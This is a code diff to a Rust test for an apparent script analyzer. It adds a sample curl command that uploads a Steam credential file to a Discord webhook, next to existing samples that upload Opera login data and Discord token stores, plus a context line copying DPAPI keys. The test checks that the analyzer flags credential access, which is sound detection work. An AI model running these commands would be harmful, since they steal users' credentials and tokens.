@@ -5203,6 +5203,7 @@ copy "%APPDATA%\Microsoft\Protect\SID\BK-MACHINE" C:\Users\Public\bk.bin
     fn curl_uploads_of_browser_and_discord_stores_emit_credential_access_traits() {
         let script = br#"curl --silent --output /dev/null -F l=@"C:\Users\puncher\AppData\Roaming\Opera Software\Opera Stable\Login Data" https://discord.com/api/webhooks/1/token
 curl --silent --output /dev/null -F level=@"C:\Users\puncher\AppData\Roaming\discord\Local Storage\leveldb\%%f" https://discord.com/api/webhooks/1/token
+curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" https://discord.com/api/webhooks/1/token
 "#;
         let report = analyze(script, &AnalyzeConfig::default());
 
@@ -5224,6 +5225,16 @@ curl --silent --output /dev/null -F level=@"C:\Users\puncher\AppData\Roaming\dis
                         && target.contains(r"discord\Local Storage\leveldb\%%f")
             )),
             "Discord token store upload path was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "steam-credential-path"
+                        && target.contains(r"Steam\config\loginusers.vdf")
+            )),
+            "Steam credential path was not surfaced: {:?}",
             report.traits
         );
     }
